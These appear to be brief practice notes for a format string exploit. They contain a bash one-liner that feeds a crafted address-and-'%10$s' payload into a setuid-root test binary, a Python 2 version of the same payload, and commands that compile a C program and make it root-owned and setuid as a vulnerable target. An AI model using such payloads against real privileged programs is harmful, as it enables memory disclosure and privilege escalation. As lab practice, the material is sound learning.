# this bash command works
echo -e $x "\x1c\xb0\x04\x08.%10\$s" | ./formatstr-root2 

# this python script fails to output \xb0 and \x08
z = "\x1c\xb0\x04\x08.%10$x"
print z


gcc formatstring.c -o formatstring2
cp formatstring2 formatstr-root2
sudo chown root formatstr-root2
sudo chmod +s formatstr-root2


gcc formatstring.c -o formatstring3
cp formatstring3 formatstr-root3
sudo chown root formatstr-root3
sudo chmod +s formatstr-root3
